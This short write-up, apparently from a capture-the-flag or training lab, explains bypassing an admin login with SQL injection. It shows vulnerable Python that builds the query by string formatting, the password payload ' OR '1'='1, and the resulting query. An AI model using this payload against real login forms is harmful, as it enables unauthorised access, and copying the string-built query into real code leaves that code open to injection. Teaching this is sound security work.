# Admin Dashboard

This is the simplest case of SQL injection. The goal is to bypass the login form and access the web application as the admin. The query on the server looks like this:

```python
cursor.execute(f"SELECT * FROM users WHERE username = '{username}' AND password='{password}'")
```

Therefore, we can bypass the login form by entering the following credentials:

```text
Username: admin
Password: ' OR '1'='1
```

This injection will make the query look like this:

```sql
SELECT * FROM users WHERE username = 'admin' AND password='' OR '1'='1'
```
